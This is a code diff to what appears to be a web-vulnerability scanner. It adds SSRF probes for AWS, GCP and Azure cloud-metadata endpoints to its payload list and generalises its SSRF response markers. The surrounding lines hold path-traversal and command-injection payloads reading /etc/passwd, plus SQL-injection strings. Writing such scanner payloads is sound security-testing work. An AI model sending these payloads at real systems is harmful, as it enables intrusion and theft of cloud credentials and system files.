@@ -88,6 +88,15 @@ DEFAULT_PAYLOADS: list[tuple[str, str, str, str]] = [
     ("traversal_passwd_deep", "../../../../../etc/passwd", "traversal", "critical"),
     ("traversal_passwd_abs", "/etc/passwd", "traversal", "critical"),
     ("ssrf_mailhog_canary", "http://mailhog:8025/", "ssrf", "critical"),
+    # Cloud metadata endpoints (ADR-012 D2 follow-up). Best-effort: GCP
+    # and Azure require specific headers (Metadata-Flavor: Google,
+    # Metadata: true) which the target must forward. AWS IMDSv1 has no
+    # header requirement; v6 is the IPv6 variant. Response-body markers
+    # in SSRF_BODY_MARKERS match content unique to each provider.
+    ("ssrf_metadata_aws", "http://169.254.169.254/latest/meta-data/", "ssrf", "critical"),
+    ("ssrf_metadata_aws_v6", "http://[fd00:ec2::254]/latest/meta-data/", "ssrf", "critical"),
+    ("ssrf_metadata_gcp", "http://metadata.google.internal/computeMetadata/v1/", "ssrf", "critical"),
+    ("ssrf_metadata_azure", "http://169.254.169.254/metadata/instance", "ssrf", "critical"),
     ("sqli_blind_true", "1' OR '1'='1", "sqli_blind", "high"),
     ("sqli_blind_false", "1' AND '1'='2", "sqli_blind", "high"),
     ("cmdi_semicolon", "; cat /etc/passwd", "cmdi", "critical"),
@@ -1166,7 +1175,7 @@ class Scanner:
 
                 # SSRF response-body oracle (Phase 4, Session B).
                 if name.startswith("ssrf_"):
-                    _ssrf_markers = {"ssrf_mailhog_canary": ["MailHog", "mailhog"]}.get(name, [])
+                    _ssrf_markers = SSRF_BODY_MARKERS.get(name, [])
                     if _ssrf_markers:
                         ssrf_raw = check_ssrf_response_oracle(
                             baseline=baseline,
